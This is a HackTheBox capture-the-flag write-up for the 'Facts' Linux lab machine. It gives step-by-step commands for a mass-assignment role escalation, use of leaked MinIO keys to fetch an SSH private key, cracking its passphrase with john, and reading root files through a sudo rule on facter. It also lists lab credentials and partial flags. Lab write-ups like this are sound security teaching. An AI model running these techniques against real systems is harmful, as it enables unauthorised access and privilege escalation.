# Facts — HackTheBox Machine Writeup

**Difficulty:** Medium  
**OS:** Linux (Ubuntu 25.04)  
**Flags:** `/home/william/flag.txt` (user), `/root/root.txt` (root)

---

## Attack Chain Overview

```
Mass Assignment (role escalation) → MinIO creds leak → SSH key from MinIO bucket → SSH brute (john) → facter sudo abuse → Root
```

---

## Step 1 — Privilege Escalation on the Web App (Mass Assignment)

### What to do
1. Log in to the Facts web app with any valid user account
2. Go to `http://facts.htb/admin/profile/edit`
3. Click **Change Password** and fill in any new password
4. Intercept the request with Burp Suite before it is sent
5. Append the following to the end of the POST body:
   ```
   &password%5Brole%5D=admin
   ```
6. Forward the request, then refresh the admin panel

The final request body should look like:
```
_method=patch&authenticity_token=<TOKEN>&password%5Bpassword%5D=newpass&password%5Bpassword_confirmation%5D=newpass&password%5Brole%5D=admin
```

### Why this works
This is a **Mass Assignment vulnerability**. The web framework (Ruby on Rails style) blindly accepts any parameter that maps to a model attribute. The `role` field is a database column but not protected from user input, so we can set our own role to `admin` just by adding it to the request. The server doesn't validate whether the user is allowed to change their own role.

---

## Step 2 — Extract MinIO Credentials from Admin Panel

### What to do
1. Navigate to **Settings → General Site → Filesystem Settings**
2. Note down:
   - **AWS S3 Access Key** (this is the MinIO access key)
   - **AWS S3 Secret Key** (this is the MinIO secret key)
   - **Endpoint:** `http://localhost:54321` (exposed externally as `http://facts.htb:54321`)

### Why this works
The Facts app uses MinIO (a self-hosted S3-compatible object storage server) for file storage. The admin panel exposes the raw credentials in plaintext in the settings page. These credentials give us full read/write access to the MinIO buckets.

---

## Step 3 — Install the MinIO Client (`mc`)

### What to do
```bash
# For ARM64 Kali (adjust arch if needed)
curl -O https://dl.min.io/client/mc/release/linux-arm64/mc
chmod +x mc
sudo mv mc /usr/local/bin/mc
mc --version
```

>  **Note:** On some Kali systems, `mc` is already taken by Midnight Commander. The MinIO client binary may be renamed `midnightcommander` automatically. Check with `which mc` and `mc --version`.

### Why this works
The `mc` (MinIO Client) is the official CLI tool to interact with MinIO/S3 buckets. We need it to browse and download files from the server.

---

## Step 4 — Connect to MinIO and List Buckets

### What to do
```bash
# Replace with actual keys from Step 2
midnightcommander alias set facts http://facts.htb:54321 'AKIADF89405350153F1A' 'IouE+2mCrqWZ+aw+Tod69eCGQO5HnuWsFxFfkP4H'

midnightcommander ls facts/
```

Expected output:
```
[2025-xx-xx] 0B internal/
[2025-xx-xx] 0B randomfacts/
```

### Why this works
We set a local alias called `facts` pointing to the MinIO server with our stolen credentials. The `ls` command lists all buckets we have access to. The `internal/` bucket is suspicious — it likely contains sensitive data not meant to be public.

---

## Step 5 — Download the SSH Private Key

### What to do
```bash
midnightcommander get facts/internal/.ssh/id_ed25519 ./id_ed25519
```

### Why this works
Someone stored an SSH private key inside the MinIO `internal` bucket (specifically in a `.ssh/` folder). This is a serious misconfiguration — private keys should never be stored in object storage. Since we have read access to the bucket, we can simply download it.

---

## Step 6 — Crack the SSH Key Passphrase

### What to do
```bash
# Convert key to john-crackable format
ssh2john ./id_ed25519 > id.hash

# Crack with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt id.hash

# Show the result
john --show id.hash
```

Result: **`dragonballz`**

### Why this works
The SSH key is passphrase-protected, so we can't use it directly. `ssh2john` extracts the encrypted hash from the key file into a format John the Ripper can crack. Since the passphrase is a weak dictionary word (`dragonballz`), rockyou.txt finds it quickly.

---

## Step 7 — Identify the Username

The key has the comment `trivia@facts.htb` embedded in it (visible when you ran `ssh-keygen -p` or inspected the key). This tells us the username is **`trivia`**.

You can also check with:
```bash
ssh-keygen -l -f ./id_ed25519
# or
cat ./id_ed25519.pub  # if pub key exists
```

---

## Step 8 — SSH into the Server

### What to do
```bash
chmod 600 ./id_ed25519
ssh trivia@facts.htb -i ./id_ed25519
# Enter passphrase: dragonballz
```

### Why this works
`chmod 600` is required because SSH refuses to use private key files that are world-readable (it's a security check). Once inside, we land as user `trivia`.

---

## Step 9 — Grab the User Flag

```bash
cat /home/william/user.txt
# 9d7d660[redacted]5d5beb3c5
```

> The flag is in william's home directory, readable by trivia.

---

## Step 10 — Privilege Escalation via `facter` (Sudo Abuse)

### What to do
```bash
# Check sudo permissions
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/facter
```

`facter` is a system inventory tool used by Puppet. It supports loading **custom Ruby fact scripts** from a directory via `--custom-dir`. Since it runs as root, any Ruby code in that directory runs as root too.

```bash
mkdir -p /tmp/piv

# Read root flag
echo 'puts File.read("/root/root.txt")' > /tmp/piv/a.rb
sudo /usr/bin/facter --custom-dir=/tmp/piv

# Read william's flag
echo 'puts File.read("/home/william/flag.txt")' > /tmp/piv/a.rb
sudo /usr/bin/facter --custom-dir=/tmp/piv
```

### Why this works
`facter --custom-dir` tells facter to load and **execute** any `.rb` (Ruby) files in that directory as part of collecting system facts. Since sudo runs facter as root with no password required, our Ruby code runs as root. We use `File.read()` to read any file on the system.

>  **Note:** `use_pty` in the sudoers config prevents getting an interactive root shell via `exec "/bin/sh"`. File read via Ruby is the workaround.

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/william/user.txt` | `9d7d660c[redacted]5beb3c5` |
| Root | `/root/root.txt` | `3364fd2[redacted]e83f1690` |

---

## Credentials & Artifacts

| Item | Value |
|------|-------|
| MinIO Access Key | `AKIADF89405350153F1A` |
| MinIO Secret Key | `IouE+2mCrqWZ+aw+Tod69eCGQO5HnuWsFxFfkP4H` |
| MinIO Endpoint | `http://facts.htb:54321` |
| SSH Key Passphrase | `dragonballz` |
| SSH User | `trivia` |

---

## Key Vulnerabilities & Lessons

| Vulnerability | Explanation |
|--------------|-------------|
| **Mass Assignment** | Web framework accepted `role=admin` from user-controlled input because the field wasn't protected |
| **Credentials in Admin UI** | MinIO secret keys stored and displayed in plaintext in settings |
| **Sensitive files in object storage** | SSH private key stored in a MinIO bucket — never put keys in S3/MinIO |
| **Weak passphrase** | SSH key passphrase was in rockyou.txt |
| **Insecure sudo rule** | `facter` allowed with `--custom-dir` means arbitrary Ruby execution as root |

---

## Tools Used

- **Burp Suite** — intercept and modify the mass assignment request
- **MinIO Client (`mc`)** — browse and download from MinIO buckets
- **ssh2john + john** — crack SSH key passphrase
- **facter** — sudo-abused for root file read via custom Ruby facts
